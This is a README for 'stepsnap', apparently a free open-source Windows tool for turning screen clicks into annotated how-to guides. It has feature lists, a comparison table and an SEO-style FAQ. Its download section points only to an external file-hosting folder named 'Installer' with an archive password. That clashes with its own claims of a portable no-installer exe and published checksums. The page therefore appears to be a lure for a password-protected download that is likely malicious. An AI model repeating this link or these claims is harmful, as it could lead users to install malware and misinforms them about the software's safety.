# stepsnap

👣 Free, open-source step-by-step guide maker for Windows — capture clicks into annotated how-tos offline. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Auto-capture on click** — every click while recording becomes a numbered screenshot with the cursor highlighted
- ✅ **Blur and redact** — one drag hides names, emails or keys before the guide is shared
- ✅ **Editable step text** — rewrites are plain sentence editing; no screenshot surgery to fix a typo
- ✅ **Export to many shapes** — PDF, HTML, Markdown with images, or DOCX for corporate templates
- ✅ **Pause and touch-up** — pause the recorder, delete a bad step, reorder by dragging
- ✅ **Local knowledge base** — guides saved as folders on disk; no cloud account, no per-guide paywall
- ✅ **100 MB self-contained exe** — runtime and capture engine bundled, portable, offline, MIT with SHA-256 releases

## Why stepsnap

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **stepsnap** | Scribe | Clarify | StepShot |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Freemium | Paid | Paid |
| Open source | **Yes** | No | No | No |
| Local-first, no account | **Yes** | No | No | Partial |
| Markdown and DOCX export | **Yes** | Partial | No | Yes |
| Blur and redact built in | **Yes** | Partial | Yes | Yes |
| Portable, no install | **Yes, 100 MB** | Web or app | Web | Installer |

## FAQ

**how to create a step-by-step guide with screenshots for free?**

Scribe and similar tools keep your screenshots in their cloud and meter exports, which is awkward for internal processes. stepsnap records clicks locally, numbers every step, lets you blur sensitive fields and exports PDF, HTML, Markdown or DOCX with no account. It is a 100 MB portable exe under MIT.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark recorder (#121418, lime #84CC16): armed REC chip, step list left with thumbnails 1 through 7, click highlight toggle on, pause button center.
2. Editor view: enlarged step screenshot with numbered bubble, blur box dragged over an email, caption field below, reorder drag handles.
3. Export panel: PDF, HTML, Markdown and DOCX cards, image quality selector, guide metadata fields, success toast reading 7 steps exported.

## Download

| Source | Link |
|---|---|
| 💾 **Installer stepsnap** | [Installer stepsnap](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).